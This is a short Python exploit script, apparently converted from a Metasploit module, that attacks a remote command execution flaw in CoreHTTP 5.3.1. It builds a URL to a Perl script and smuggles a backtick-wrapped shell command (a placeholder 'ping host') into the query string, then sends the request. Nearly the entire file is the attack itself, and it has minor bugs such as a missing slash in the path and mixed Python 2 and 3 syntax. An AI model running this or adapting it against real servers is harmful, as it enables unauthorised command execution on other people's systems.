#!/usr/bin/python
import requests
import sys

#This is a quick python conversion from the MSF module that exploits an RCE vulnerability in CoreHTTP 5.3.1

if len(sys.argv) < 2:
        print("python exploit.py <ip> <port> ".format(sys.argv[0]))
        sys.exit(1)

rhost = sys.argv[1]
rport = sys.argv[2]
path = 'file.pl' # should be the path of foo.pl on the remote host
cmd = 'ping host'
cmd += '&'
cmd = cmd.replace(" ","%20")

print cmd

url = "http://" + rhost + ":" + str(rport)
url += path
url += "?%60"
url += cmd
url += "%60"
url = url.replace("&", "%26")


print url

r = requests.get(url)



